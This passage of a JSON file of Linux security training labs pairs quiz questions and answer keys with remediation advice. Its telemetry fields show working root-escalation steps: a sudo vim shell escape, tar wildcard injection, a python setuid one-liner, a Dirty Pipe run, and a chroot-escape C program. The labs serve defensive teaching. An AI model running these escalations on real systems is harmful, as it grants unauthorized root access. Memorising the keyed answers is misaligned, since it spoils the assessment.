        "prompt": "1. What numeric octal permission bit corresponds to SetUID (SUID)?",
        "expected": "4000",
        "acceptedKeywords": [
          "4000",
          "4",
          "u+s"
        ],
        "hint": "First octet in 4755.",
        "explanation": "Expected: 4000. Concept: Verified through Linux system security and POSIX standards."
      },
      {
        "id": "t2",
        "prompt": "2. Which misconfigured utility binary in /usr/bin allowed the cadet to spawn a root shell?",
        "expected": "/usr/bin/find",
        "acceptedKeywords": [
          "/usr/bin/find",
          "find"
        ],
        "hint": "File searching utility with -exec flag.",
        "explanation": "Expected: /usr/bin/find. Concept: Verified through Linux system security and POSIX standards."
      },
      {
        "id": "t3",
        "prompt": "3. What is the effective User ID (euid) when executing with root privileges?",
        "expected": "0",
        "acceptedKeywords": [
          "0",
          "root"
        ],
        "hint": "Root UID number.",
        "explanation": "Expected: 0. Concept: Verified through Linux system security and POSIX standards."
      },
      {
        "id": "t4",
        "prompt": "4. What flag passed to /bin/sh prevents the shell from dropping SUID root privileges?",
        "expected": "-p",
        "acceptedKeywords": [
          "-p",
          "privileged"
        ],
        "hint": "Preserve privileges flag.",
        "explanation": "Expected: -p. Concept: Verified through Linux system security and POSIX standards."
      },
      {
        "id": "t5",
        "prompt": "5. What curated online catalog documents Unix binaries that can be bypassed/abused for privilege escalation?",
        "expected": "GTFOBins",
        "acceptedKeywords": [
          "GTFOBins",
          "gtfobins"
        ],
        "hint": "Famous community repository gtfobins.github.io.",
        "explanation": "Expected: GTFOBins. Concept: Verified through Linux system security and POSIX standards."
      },
      {
        "id": "t6",
        "prompt": "6. What chmod command strips the SUID bit from /usr/bin/find?",
        "expected": "chmod u-s /usr/bin/find",
        "acceptedKeywords": [
          "chmod u-s /usr/bin/find",
          "chmod 755 /usr/bin/find",
          "chmod u-s"
        ],
        "hint": "chmod command with u-s.",
        "explanation": "Expected: chmod u-s /usr/bin/find. Concept: Verified through Linux system security and POSIX standards."
      }
    ],
    "remediationGuide": "Audit all SUID files using find / -perm -4000, remove SUID bits from non-essential utilities (chmod u-s /usr/bin/find), and mount /home with nosuid option."
  },
  {
    "id": "lab-lin-002",
    "category": "Linux Security & Bash Hardening",
    "title": "Sudoers Misconfiguration & NOPASSWD Abuse",
    "difficulty": "Beginner",
    "timeEst": "12 min",
    "xpReward": 130,
    "briefing": "Inspect the /etc/sudoers configuration where standard users were granted unrestricted passwordless execution of administrative maintenance commands.",
    "telemetry": "cadet@lab-host:~$ sudo -l\nMatching Defaults entries for cadet on lab-host:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\n\nUser cadet may run the following commands on lab-host:\n    (root) NOPASSWD: /usr/bin/vim /etc/nginx/nginx.conf\nExploitation:\ncadet@lab-host:~$ sudo /usr/bin/vim /etc/nginx/nginx.conf\n:!/bin/bash\nroot@lab-host:/etc/nginx# whoami\nroot",
    "tasks": [
      {
        "id": "t1",
        "prompt": "1. What command lists the allowed and forbidden sudo commands for the invoking user?",
        "expected": "sudo -l",
        "acceptedKeywords": [
          "sudo -l",
          "sudo -l -l"
        ],
        "hint": "List flag for sudo.",
        "explanation": "Expected: sudo -l. Concept: Verified through Linux system security and POSIX standards."
      },
      {
        "id": "t2",
        "prompt": "2. What directive in /etc/sudoers allows command execution without prompting for a user password?",
        "expected": "NOPASSWD",
        "acceptedKeywords": [
          "NOPASSWD",
          "NOPASSWD:"
        ],
        "hint": "Tag keyword in sudoers.",
        "explanation": "Expected: NOPASSWD. Concept: Verified through Linux system security and POSIX standards."
      },
      {
        "id": "t3",
        "prompt": "3. What text editor binary was permitted under NOPASSWD in this configuration?",
        "expected": "/usr/bin/vim",
        "acceptedKeywords": [
          "/usr/bin/vim",
          "vim"
        ],
        "hint": "Vi IMproved editor path.",
        "explanation": "Expected: /usr/bin/vim. Concept: Verified through Linux system security and POSIX standards."
      },
      {
        "id": "t4",
        "prompt": "4. What vim command escape prefix \":!\" allows executing arbitrary shell commands from inside the editor?",
        "expected": ":!",
        "acceptedKeywords": [
          ":!",
          "!"
        ],
        "hint": "Colon followed by exclamation mark.",
        "explanation": "Expected: :!. Concept: Verified through Linux system security and POSIX standards."
      },
      {
        "id": "t5",
        "prompt": "5. What file holds the central sudo authorization policy on Linux systems?",
        "expected": "/etc/sudoers",
        "acceptedKeywords": [
          "/etc/sudoers",
          "sudoers"
        ],
        "hint": "Path in /etc.",
        "explanation": "Expected: /etc/sudoers. Concept: Verified through Linux system security and POSIX standards."
      },
      {
        "id": "t6",
        "prompt": "6. What dedicated editor command must always be used to safely validate /etc/sudoers syntax before saving?",
        "expected": "visudo",
        "acceptedKeywords": [
          "visudo"
        ],
        "hint": "Dedicated lock and syntax checking command.",
        "explanation": "Expected: visudo. Concept: Verified through Linux system security and POSIX standards."
      }
    ],
    "remediationGuide": "Never grant NOPASSWD on interactive binaries (vim, less, nano, python). Edit sudoers only with visudo and require password authentication."
  },
  {
    "id": "lab-lin-003",
    "category": "Linux Security & Bash Hardening",
    "title": "Cron Job Wildcard Injection & Root Shell Privilege Escalation",
    "difficulty": "Intermediate",
    "timeEst": "16 min",
    "xpReward": 160,
    "briefing": "A root cron job executed a tar backup using an unquoted wildcard asterisk (*). Exploit tar command-line parameter injection to trigger an arbitrary script.",
    "telemetry": "File: /etc/crontab\n* * * * * root cd /var/www/html && tar -czf /backups/backup.tar.gz *\n\nAdversary files planted in /var/www/html:\n-rw-r--r-- 1 cadet cadet    0 Sep 29 10:00 --checkpoint=1\n-rw-r--r-- 1 cadet cadet    0 Sep 29 10:00 --checkpoint-action=exec=sh\\ shell.sh\n-rwxr-xr-x 1 cadet cadet   64 Sep 29 10:00 shell.sh\nContent of shell.sh:\n  chmod +s /bin/bash",
    "tasks": [
      {
        "id": "t1",
        "prompt": "1. What shell wildcard character (*) expands filenames into command-line arguments in bash?",
        "expected": "Asterisk",
        "acceptedKeywords": [
          "Asterisk",
          "*",
          "wildcard"
        ],
        "hint": "The star / asterisk symbol.",
        "explanation": "Expected: Asterisk. Concept: Verified through Linux system security and POSIX standards."
      },
      {
        "id": "t2",
        "prompt": "2. What command-line archiving utility was executed in the scheduled cron job?",
        "expected": "tar",
        "acceptedKeywords": [
          "tar",
          "/bin/tar"
        ],
        "hint": "Standard tape archive tool.",
        "explanation": "Expected: tar. Concept: Verified through Linux system security and POSIX standards."
      },
      {
        "id": "t3",
        "prompt": "3. What tar parameter flag triggers command execution upon reaching a checkpoint?",
        "expected": "--checkpoint-action",
        "acceptedKeywords": [
          "--checkpoint-action",
          "--checkpoint-action=exec"
        ],
        "hint": "Checkpoint action option.",
        "explanation": "Expected: --checkpoint-action. Concept: Verified through Linux system security and POSIX standards."
      },
      {
        "id": "t4",
        "prompt": "4. What system directory in /etc contains the system-wide crontab schedule?",
        "expected": "/etc/crontab",
        "acceptedKeywords": [
          "/etc/crontab",
          "crontab"
        ],
        "hint": "System crontab configuration file.",
        "explanation": "Expected: /etc/crontab. Concept: Verified through Linux system security and POSIX standards."
      },
      {
        "id": "t5",
        "prompt": "5. What command in shell.sh gave /bin/bash SUID root permissions?",
        "expected": "chmod +s /bin/bash",
        "acceptedKeywords": [
          "chmod +s /bin/bash",
          "chmod +s",
          "chmod 4755"
        ],
        "hint": "Adding SUID bit to bash.",
        "explanation": "Expected: chmod +s /bin/bash. Concept: Verified through Linux system security and POSIX standards."
      },
      {
        "id": "t6",
        "prompt": "6. How should backup scripts be written to prevent wildcard injection vulnerabilities?",
        "expected": "Avoid wildcards or use full paths",
        "acceptedKeywords": [
          "Avoid wildcards",
          "specify files explicitly",
          "full path",
          "do not use *"
        ],
        "hint": "Explicit path specification instead of star.",
        "explanation": "Expected: Avoid wildcards or use full paths. Concept: Verified through Linux system security and POSIX standards."
      }
    ],
    "remediationGuide": "Avoid raw wildcard expansion in root scripts (use tar -czf /backups/backup.tar.gz . instead of *), and restrict write permissions on /var/www/html."
  },
  {
    "id": "lab-lin-004",
    "category": "Linux Security & Bash Hardening",
    "title": "Linux /etc/shadow Password Hash Extraction & Security",
    "difficulty": "Beginner",
    "timeEst": "12 min",
    "xpReward": 120,
    "briefing": "Examine permissions on /etc/shadow and /etc/passwd files, understand password hash algorithms, and audit security configurations.",
    "telemetry": "ls -la /etc/shadow\n-rw-r--r-- 1 root root 1240 Sep 29 09:12 /etc/shadow (CRITICAL PERMISSION ERROR: World-Readable!)\n\nContents:\nroot:$6$rounds=5000$Sal7yStr1ng$H4sh3dStr1ngV4lu3...:19240:0:99999:7:::\ncadet:$y$j9T$Sa1tValu3$HashValu3...:19240:0:99999:7:::",
    "tasks": [
      {
        "id": "t1",
        "prompt": "1. What standard Linux file stores encrypted user password hashes?",
        "expected": "/etc/shadow",
        "acceptedKeywords": [
          "/etc/shadow",
          "shadow"
        ],
        "hint": "Shadow password file.",
        "explanation": "Expected: /etc/shadow. Concept: Verified through Linux system security and POSIX standards."
      },
      {
        "id": "t2",
        "prompt": "2. What file permissions (octal) should /etc/shadow strictly possess?",
        "expected": "600",
        "acceptedKeywords": [
          "600",
          "640",
          "-rw-------",
          "0600"
        ],
        "hint": "Read/write by root only.",
        "explanation": "Expected: 600. Concept: Verified through Linux system security and POSIX standards."
      },
      {
        "id": "t3",
        "prompt": "3. In the hash string \"$6$...\", what hashing algorithm is designated by ID 6?",
        "expected": "SHA-512",
        "acceptedKeywords": [
          "SHA-512",
          "sha512",
          "SHA512"
        ],
        "hint": "Standard Linux SHA-512 crypt.",
        "explanation": "Expected: SHA-512. Concept: Verified through Linux system security and POSIX standards."
      },
      {
        "id": "t4",
        "prompt": "4. In modern Linux systems, what hash algorithm ID \"$y$\" designates yescrypt (memory-hard)?",
        "expected": "yescrypt",
        "acceptedKeywords": [
          "yescrypt"
        ],
        "hint": "Modern default in Debian 11+ and Ubuntu 22.04+.",
        "explanation": "Expected: yescrypt. Concept: Verified through Linux system security and POSIX standards."
      },
      {
        "id": "t5",
        "prompt": "5. What command enforces correct root-only permissions on /etc/shadow?",
        "expected": "chmod 600 /etc/shadow",
        "acceptedKeywords": [
          "chmod 600 /etc/shadow",
          "chmod 0600 /etc/shadow"
        ],
        "hint": "chmod command setting 600.",
        "explanation": "Expected: chmod 600 /etc/shadow. Concept: Verified through Linux system security and POSIX standards."
      },
      {
        "id": "t6",
        "prompt": "6. What companion file stores user accounts and shell paths and must remain world-readable?",
        "expected": "/etc/passwd",
        "acceptedKeywords": [
          "/etc/passwd",
          "passwd"
        ],
        "hint": "User account file.",
        "explanation": "Expected: /etc/passwd. Concept: Verified through Linux system security and POSIX standards."
      }
    ],
    "remediationGuide": "Run chmod 600 /etc/shadow immediately and chown root:root /etc/shadow. Audit /etc/passwd for accounts with UID 0."
  },
  {
    "id": "lab-lin-005",
    "category": "Linux Security & Bash Hardening",
    "title": "SSH Authorized_Keys Backdoor Injection Forensics",
    "difficulty": "Beginner",
    "timeEst": "14 min",
    "xpReward": 130,
    "briefing": "Threat actors frequently plant public SSH keys in /root/.ssh/authorized_keys to preserve root shell access even after password changes. Audit the authorized keys repository.",
    "telemetry": "File: /root/.ssh/authorized_keys\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC8v1... admin-workstation@tactical.mil (Legitimate)\nssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOmg4... hostile-c2-operator@shadow-ops.net (ROGUE KEY!)\n\nFile Timestamps:\n  Access: 2026-09-29 12:00:00\n  Modify: 2026-09-29 03:14:22 (Matches breach window)\n  Change: 2026-09-29 03:14:22",
    "tasks": [
      {
        "id": "t1",
        "prompt": "1. What configuration file in the user home directory stores authorized SSH public keys?",
        "expected": "authorized_keys",
        "acceptedKeywords": [
          "authorized_keys",
          "~/.ssh/authorized_keys",
          "/root/.ssh/authorized_keys"
        ],
        "hint": "Standard OpenSSH key authorized file.",
        "explanation": "Expected: authorized_keys. Concept: Verified through Linux system security and POSIX standards."
      },
      {
        "id": "t2",
        "prompt": "2. What is the comment/email identity associated with the rogue SSH key entry?",
        "expected": "hostile-c2-operator@shadow-ops.net",
        "acceptedKeywords": [
          "hostile-c2-operator@shadow-ops.net"
        ],
        "hint": "Comment at the end of the key line.",
        "explanation": "Expected: hostile-c2-operator@shadow-ops.net. Concept: Verified through Linux system security and POSIX standards."
      },
      {
        "id": "t3",
        "prompt": "3. What modern elliptic curve cryptographic algorithm is designated by \"ssh-ed25519\"?",
        "expected": "Ed25519",
        "acceptedKeywords": [
          "Ed25519",
          "ed25519",
          "Edwards25519"
        ],
        "hint": "High-speed elliptic curve signature scheme.",
        "explanation": "Expected: Ed25519. Concept: Verified through Linux system security and POSIX standards."
      },
      {
        "id": "t4",
        "prompt": "4. What permissions (octal) must the .ssh folder strictly have to prevent unauthorized access?",
        "expected": "700",
        "acceptedKeywords": [
          "700",
          "0700",
          "drwx------"
        ],
        "hint": "Read, write, execute by owner only.",
        "explanation": "Expected: 700. Concept: Verified through Linux system security and POSIX standards."
      },
      {
        "id": "t5",
        "prompt": "5. What OpenSSH server configuration directive disables root login via SSH entirely?",
        "expected": "PermitRootLogin no",
        "acceptedKeywords": [
          "PermitRootLogin no",
          "PermitRootLogin",
          "no"
        ],
        "hint": "sshd_config directive.",
        "explanation": "Expected: PermitRootLogin no. Concept: Verified through Linux system security and POSIX standards."
      },
      {
        "id": "t6",
        "prompt": "6. What command removes the rogue authorized key line safely?",
        "expected": "sed -i or text editor",
        "acceptedKeywords": [
          "sed",
          "vim",
          "nano",
          "sed -i",
          "editor"
        ],
        "hint": "Editing file or sed stream editor.",
        "explanation": "Expected: sed -i or text editor. Concept: Verified through Linux system security and POSIX standards."
      }
    ],
    "remediationGuide": "Purge unauthorized keys from /root/.ssh/authorized_keys, set PermitRootLogin no in /etc/ssh/sshd_config, and restart sshd."
  },
  {
    "id": "lab-lin-006",
    "category": "Linux Security & Bash Hardening",
    "title": "Linux Capabilities Exploitation (cap_setuid+ep)",
    "difficulty": "Advanced",
    "timeEst": "18 min",
    "xpReward": 190,
    "briefing": "Linux capabilities divide traditional superuser privileges into distinct units. A developer set cap_setuid+ep on python3, allowing unprivileged users to change their UID to 0.",
    "telemetry": "Command: getcap -r / 2>/dev/null\n/usr/bin/ping cap_net_raw+ep\n/usr/bin/python3.10 cap_setuid+ep (VULNERABLE CAPABILITY!)\n\nExploitation:\ncadet@lab:~$ python3.10 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'\nroot@lab:~# id\nuid=0(root) gid=1001(cadet)",
    "tasks": [
      {
        "id": "t1",
        "prompt": "1. What Linux tool lists capabilities assigned to executable files across the filesystem?",
        "expected": "getcap",
        "acceptedKeywords": [
          "getcap",
          "/sbin/getcap"
        ],
        "hint": "Command paired with setcap.",
        "explanation": "Expected: getcap. Concept: Verified through Linux system security and POSIX standards."
      },
      {
        "id": "t2",
        "prompt": "2. Which Linux capability allows an executable to manipulate and assume arbitrary User IDs?",
        "expected": "cap_setuid",
        "acceptedKeywords": [
          "cap_setuid",
          "CAP_SETUID"
        ],
        "hint": "Capability name for setuid.",
        "explanation": "Expected: cap_setuid. Concept: Verified through Linux system security and POSIX standards."
      },
      {
        "id": "t3",
        "prompt": "3. What interpreter executable possessed this dangerous capability in the telemetry?",
        "expected": "python3.10",
        "acceptedKeywords": [
          "python3.10",
          "/usr/bin/python3.10",
          "python3"
        ],
        "hint": "Python binary in getcap output.",
        "explanation": "Expected: python3.10. Concept: Verified through Linux system security and POSIX standards."
      },
      {
        "id": "t4",
        "prompt": "4. What Python built-in module provides the setuid() function?",
        "expected": "os",
        "acceptedKeywords": [
          "os",
          "import os"
        ],
        "hint": "Operating System interaction module.",
        "explanation": "Expected: os. Concept: Verified through Linux system security and POSIX standards."
      },
      {
        "id": "t5",
        "prompt": "5. What command strips all capabilities from /usr/bin/python3.10?",
        "expected": "setcap -r /usr/bin/python3.10",
        "acceptedKeywords": [
          "setcap -r",
          "setcap -r /usr/bin/python3.10"
        ],
        "hint": "setcap with -r (remove) flag.",
        "explanation": "Expected: setcap -r /usr/bin/python3.10. Concept: Verified through Linux system security and POSIX standards."
      },
      {
        "id": "t6",
        "prompt": "6. What capability allows raw socket crafting without full root privileges (used by ping)?",
        "expected": "cap_net_raw",
        "acceptedKeywords": [
          "cap_net_raw",
          "CAP_NET_RAW"
        ],
        "hint": "Raw network socket capability.",
        "explanation": "Expected: cap_net_raw. Concept: Verified through Linux system security and POSIX standards."
      }
    ],
    "remediationGuide": "Remove the capability using setcap -r /usr/bin/python3.10 and audit system capabilities regularly via getcap -r /."
  },
  {
    "id": "lab-lin-007",
    "category": "Linux Security & Bash Hardening",
    "title": "Linux PAM (Pluggable Authentication Modules) Backdoor Triage",
    "difficulty": "Advanced",
    "timeEst": "20 min",
    "xpReward": 220,
    "briefing": "Adversaries compiled and injected a malicious pam_unix.so module that accepts a hardcoded master password (\"DefenseBypass99!\") for any valid account on the system.",
    "telemetry": "File: /lib/x86_64-linux-gnu/security/pam_unix.so\nHash Mismatch:\n  Expected: 39a1f49... (Ubuntu Official Repository)\n  Actual:   82b104c... (MODIFIED BINARY!)\n\nDisassembly strings check:\n  $ strings /lib/x86_64-linux-gnu/security/pam_unix.so | grep -i bypass\n  DefenseBypass99!\n  Authentication backdoor active.",
    "tasks": [
      {
        "id": "t1",
        "prompt": "1. What Linux authentication architecture framework manages logins across services?",
        "expected": "PAM",
        "acceptedKeywords": [
          "PAM",
          "Pluggable Authentication Modules"
        ],
        "hint": "Pluggable Authentication Modules.",
        "explanation": "Expected: PAM. Concept: Verified through Linux system security and POSIX standards."
      },
      {
        "id": "t2",
        "prompt": "2. What standard PAM module responsible for traditional Unix password authentication was tampered with?",
        "expected": "pam_unix.so",
        "acceptedKeywords": [
          "pam_unix.so",
          "pam_unix"
        ],
        "hint": "Core Unix authentication shared library.",
        "explanation": "Expected: pam_unix.so. Concept: Verified through Linux system security and POSIX standards."
      },
      {
        "id": "t3",
        "prompt": "3. What hardcoded backdoor password string was extracted from the tampered module?",
        "expected": "DefenseBypass99!",
        "acceptedKeywords": [
          "DefenseBypass99!"
        ],
        "hint": "String found in disassembly output.",
        "explanation": "Expected: DefenseBypass99!. Concept: Verified through Linux system security and POSIX standards."
      },
      {
        "id": "t4",
        "prompt": "4. What directory on 64-bit Debian/Ubuntu systems stores PAM security modules?",
        "expected": "/lib/x86_64-linux-gnu/security",
        "acceptedKeywords": [
          "/lib/x86_64-linux-gnu/security",
          "security"
        ],
        "hint": "Library path in telemetry.",
        "explanation": "Expected: /lib/x86_64-linux-gnu/security. Concept: Verified through Linux system security and POSIX standards."
      },
      {
        "id": "t5",
        "prompt": "5. What package management verification command checks installed package file checksums against package metadata on Debian/Ubuntu?",
        "expected": "debsums",
        "acceptedKeywords": [
          "debsums",
          "debsums -c",
          "dpkg -V"
        ],
        "hint": "Utility to check integrity of installed files.",
        "explanation": "Expected: debsums. Concept: Verified through Linux system security and POSIX standards."
      },
      {
        "id": "t6",
        "prompt": "6. What directory in /etc contains service-specific PAM configuration files?",
        "expected": "/etc/pam.d",
        "acceptedKeywords": [
          "/etc/pam.d",
          "pam.d"
        ],
        "hint": "PAM configuration directory.",
        "explanation": "Expected: /etc/pam.d. Concept: Verified through Linux system security and POSIX standards."
      }
    ],
    "remediationGuide": "Reinstall the libpam-modules package via apt-get install --reinstall libpam-modules, verify with debsums, and audit all active SSH sessions."
  },
  {
    "id": "lab-lin-008",
    "category": "Linux Security & Bash Hardening",
    "title": "Auditd Log Analysis for Privilege Escalation Hunting",
    "difficulty": "Intermediate",
    "timeEst": "16 min",
    "xpReward": 160,
    "briefing": "The Linux Audit daemon (auditd) recorded an execution event where an unprivileged service account invoked /bin/bash via an unexpected parent process.",
    "telemetry": "type=SYSCALL msg=audit(1696001210.123:4021): arch=c000003e syscall=59 success=yes exit=0\n  a0=7ffe1230 a1=7ffe1248 a2=7ffe1260 a3=7f\n  items=2 ppid=840 pid=3912 auid=1002 uid=33(www-data) gid=33(www-data) euid=0(root)\n  tty=(none) comm=\"bash\" exe=\"/bin/bash\" key=\"privesc_exec\"\ntype=EXECVE msg=audit(1696001210.123:4021): argc=3 a0=\"bash\" a1=\"-c\" a2=\"cat /etc/shadow\"",
    "tasks": [
      {
        "id": "t1",
        "prompt": "1. What Linux system call number 59 (syscall=59 on x86_64) represents executing a program?",
        "expected": "execve",
        "acceptedKeywords": [
          "execve",
          "sys_execve"
        ],
        "hint": "Standard program execution system call.",
        "explanation": "Expected: execve. Concept: Verified through Linux system security and POSIX standards."
      },
      {
        "id": "t2",
        "prompt": "2. What web server user account (UID 33) executed the command?",
        "expected": "www-data",
        "acceptedKeywords": [
          "www-data",
          "uid=33"
        ],
        "hint": "Standard Apache/Nginx service user.",
        "explanation": "Expected: www-data. Concept: Verified through Linux system security and POSIX standards."
      },
      {
        "id": "t3",
        "prompt": "3. What effective User ID (euid) was gained upon command completion?",
        "expected": "0",
        "acceptedKeywords": [
          "0",
          "root",
          "euid=0"
        ],
        "hint": "Superuser ID.",
        "explanation": "Expected: 0. Concept: Verified through Linux system security and POSIX standards."
      },
      {
        "id": "t4",
        "prompt": "4. What command argument (a2) was executed by the adversary?",
        "expected": "cat /etc/shadow",
        "acceptedKeywords": [
          "cat /etc/shadow"
        ],
        "hint": "Third argument in EXECVE record.",
        "explanation": "Expected: cat /etc/shadow. Concept: Verified through Linux system security and POSIX standards."
      },
      {
        "id": "t5",
        "prompt": "5. What auditd query utility filters audit logs by key name (e.g. key=\"privesc_exec\")?",
        "expected": "ausearch",
        "acceptedKeywords": [
          "ausearch",
          "ausearch -k privesc_exec",
          "ausearch -k"
        ],
        "hint": "Audit search utility.",
        "explanation": "Expected: ausearch. Concept: Verified through Linux system security and POSIX standards."
      },
      {
        "id": "t6",
        "prompt": "6. What auditd reporting tool generates statistical summaries of failed and successful events?",
        "expected": "aureport",
        "acceptedKeywords": [
          "aureport"
        ],
        "hint": "Audit reporting utility.",
        "explanation": "Expected: aureport. Concept: Verified through Linux system security and POSIX standards."
      }
    ],
    "remediationGuide": "Investigate the web application parent process (PID 840) for remote code execution vulnerabilities, revoke root escalation vectors, and terminate PID 3912."
  },
  {
    "id": "lab-lin-009",
    "category": "Linux Security & Bash Hardening",
    "title": "Linux Kernel Vulnerabilities (Dirty Pipe CVE-2022-0847)",
    "difficulty": "Advanced",
    "timeEst": "18 min",
    "xpReward": 210,
    "briefing": "Adversaries leveraged an unpatched Linux kernel pipe buffer flaw (Dirty Pipe) to overwrite /etc/passwd without write permissions, injecting a root user.",
    "telemetry": "Host Kernel: Linux range-srv 5.13.0-30-generic #34-Ubuntu SMP x86_64 (VULNERABLE!)\nExploitation Telemetry:\n  $ ./dirtypipe /etc/passwd 1 \"root:x:0:0:root:/root:/bin/bash\"\n  [+] Backing up /etc/passwd to /tmp/passwd.bak\n  [+] Splicing pipe buffer page cache...\n  [+] Successfully overwritten root password hash with null/attacker password!\n  $ su - root\n  root@range-srv:~# id\n  uid=0(root) gid=0(root)",
    "tasks": [
      {
        "id": "t1",
        "prompt": "1. What is the CVE identifier for the famous Dirty Pipe Linux kernel vulnerability?",
        "expected": "CVE-2022-0847",
        "acceptedKeywords": [
          "CVE-2022-0847",
          "2022-0847"
        ],
        "hint": "CVE issued in early 2022.",
        "explanation": "Expected: CVE-2022-0847. Concept: Verified through Linux system security and POSIX standards."
      },
      {
        "id": "t2",
        "prompt": "2. What kernel data structure mechanism did Dirty Pipe abuse to overwrite read-only page cache memory?",
        "expected": "Pipe buffer",
        "acceptedKeywords": [
          "Pipe buffer",
          "pipe",
          "page cache"
        ],
        "hint": "IPC mechanism involving pipes.",
        "explanation": "Expected: Pipe buffer. Concept: Verified through Linux system security and POSIX standards."
      },
      {
        "id": "t3",
        "prompt": "3. What critical system file was targeted to inject the backdoor root account?",
        "expected": "/etc/passwd",
        "acceptedKeywords": [
          "/etc/passwd",
          "passwd"
        ],
        "hint": "Account database file.",
        "explanation": "Expected: /etc/passwd. Concept: Verified through Linux system security and POSIX standards."
      },
      {
        "id": "t4",
        "prompt": "4. What command displays the currently active Linux kernel release version?",
        "expected": "uname -r",
        "acceptedKeywords": [
          "uname -r",
          "uname -a"
        ],
        "hint": "uname with release flag.",
        "explanation": "Expected: uname -r. Concept: Verified through Linux system security and POSIX standards."
      },
      {
        "id": "t5",
        "prompt": "5. What predecessor kernel race condition flaw (CVE-2016-5195) had a similar name?",
        "expected": "Dirty COW",
        "acceptedKeywords": [
          "Dirty COW",
          "dirtycow"
        ],
        "hint": "Copy-On-Write vulnerability.",
        "explanation": "Expected: Dirty COW. Concept: Verified through Linux system security and POSIX standards."
      },
      {
        "id": "t6",
        "prompt": "6. What is the fundamental remediation for local kernel privilege escalation vulnerabilities?",
        "expected": "Apply kernel security updates / reboot",
        "acceptedKeywords": [
          "kernel update",
          "patch kernel",
          "reboot",
          "update kernel"
        ],
        "hint": "Updating kernel package.",
        "explanation": "Expected: Apply kernel security updates / reboot. Concept: Verified through Linux system security and POSIX standards."
      }
    ],
    "remediationGuide": "Upgrade Linux kernel to patched version (5.16.11, 5.15.25, 5.10.102 or higher), reboot system, and restore clean /etc/passwd."
  },
  {
    "id": "lab-lin-010",
    "category": "Linux Security & Bash Hardening",
    "title": "IPTables & UFW Defense Rule Engineering",
    "difficulty": "Intermediate",
    "timeEst": "15 min",
    "xpReward": 150,
    "briefing": "Configure stateful host firewall rules using iptables and UFW to protect a database node, allowing only SSH from the bastion and MSSQL from the web tier.",
    "telemetry": "Network Requirements:\n  - Bastion Host: 10.0.1.10 -> Allow SSH (port 22)\n  - Web Server Farm: 10.0.2.0/24 -> Allow MySQL (port 3306)\n  - Loopback Interface: Allow all local traffic\n  - Established Connections: Allow RELATED,ESTABLISHED\n  - Default Inbound Policy: DROP all other traffic\nCurrent iptables status: Default ACCEPT (COMPLETELY EXPOSED!)",
    "tasks": [
      {
        "id": "t1",
        "prompt": "1. What iptables parameter sets the default policy for the INPUT chain?",
        "expected": "iptables -P INPUT DROP",
        "acceptedKeywords": [
          "iptables -P INPUT DROP",
          "-P INPUT DROP",
          "-P"
        ],
        "hint": "Policy flag -P.",
        "explanation": "Expected: iptables -P INPUT DROP. Concept: Verified through Linux system security and POSIX standards."
      },
      {
        "id": "t2",
        "prompt": "2. What state module match allows response traffic for existing sessions?",
        "expected": "RELATED,ESTABLISHED",
        "acceptedKeywords": [
          "RELATED,ESTABLISHED",
          "ESTABLISHED,RELATED",
          "state"
        ],
        "hint": "State tracking match.",
        "explanation": "Expected: RELATED,ESTABLISHED. Concept: Verified through Linux system security and POSIX standards."
      },
      {
        "id": "t3",
        "prompt": "3. What interface name \"-i\" represents the local host loopback interface?",
        "expected": "lo",
        "acceptedKeywords": [
          "lo",
          "loopback"
        ],
        "hint": "Local loopback interface acronym.",
        "explanation": "Expected: lo. Concept: Verified through Linux system security and POSIX standards."
      },
      {
        "id": "t4",
        "prompt": "4. What command allows inbound TCP traffic on port 22 strictly from source 10.0.1.10?",
        "expected": "iptables -A INPUT -p tcp -s 10.0.1.10 --dport 22 -j ACCEPT",
        "acceptedKeywords": [
          "iptables -A INPUT -p tcp -s 10.0.1.10 --dport 22 -j ACCEPT",
          "iptables -A INPUT -s 10.0.1.10 -p tcp --dport 22 -j ACCEPT"
        ],
        "hint": "iptables append rule with -s and --dport.",
        "explanation": "Expected: iptables -A INPUT -p tcp -s 10.0.1.10 --dport 22 -j ACCEPT. Concept: Verified through Linux system security and POSIX standards."
      },
      {
        "id": "t5",
        "prompt": "5. What simplified frontend tool manages firewall rules on Ubuntu systems?",
        "expected": "UFW",
        "acceptedKeywords": [
          "UFW",
          "ufw",
          "Uncomplicated Firewall"
        ],
        "hint": "Uncomplicated Firewall.",
        "explanation": "Expected: UFW. Concept: Verified through Linux system security and POSIX standards."
      },
      {
        "id": "t6",
        "prompt": "6. What package ensures iptables rules survive system reboots on Debian/Ubuntu?",
        "expected": "iptables-persistent",
        "acceptedKeywords": [
          "iptables-persistent",
          "netfilter-persistent"
        ],
        "hint": "Persistence package name.",
        "explanation": "Expected: iptables-persistent. Concept: Verified through Linux system security and POSIX standards."
      }
    ],
    "remediationGuide": "Apply iptables -P INPUT DROP, allow only authorized source IPs for administrative ports, and install iptables-persistent."
  },
  {
    "id": "lab-lin-011",
    "category": "Linux Security & Bash Hardening",
    "title": "Chroot Jail Escapes & Linux Namespace Isolation",
    "difficulty": "Advanced",
    "timeEst": "18 min",
    "xpReward": 190,
    "briefing": "An unprivileged attacker confined in a chroot jail escaped to the host filesystem because the process retained root privileges inside the jail.",
    "telemetry": "Escape Code C Exploit:\n  int main() {\n    mkdir(\"chroot_break\", 0755);\n    chroot(\"chroot_break\");\n    for(int i=0; i<50; i++) chdir(\"..\");\n    chroot(\".\");\n    system(\"/bin/sh\");\n  }\nResult: Process traversed relative parent directories (\"..\") beyond jail boundary and reset chroot root to host root filesystem!",
    "tasks": [
      {
        "id": "t1",
        "prompt": "1. What system call restricts an application view of the filesystem to a specific directory root?",
        "expected": "chroot",
        "acceptedKeywords": [
          "chroot",
          "chroot()"
        ],
        "hint": "Change root system call.",
        "explanation": "Expected: chroot. Concept: Verified through Linux system security and POSIX standards."
      },
      {
        "id": "t2",
        "prompt": "2. Why was the process able to break out of the chroot jail in this exploit?",
        "expected": "Ran with root privileges / UID 0",
        "acceptedKeywords": [
          "root",
          "UID 0",
          "retained root",
          "ran as root"
        ],
        "hint": "chroot does not drop privileges by itself.",
        "explanation": "Expected: Ran with root privileges / UID 0. Concept: Verified through Linux system security and POSIX standards."
      },
      {
        "id": "t3",
        "prompt": "3. What directory traversal sequence (\"..\") was iterated to reach the actual host root?",
        "expected": "chdir(\"..\")",
        "acceptedKeywords": [
          "chdir(\"..\")",
          "..",
          "parent directory"
        ],
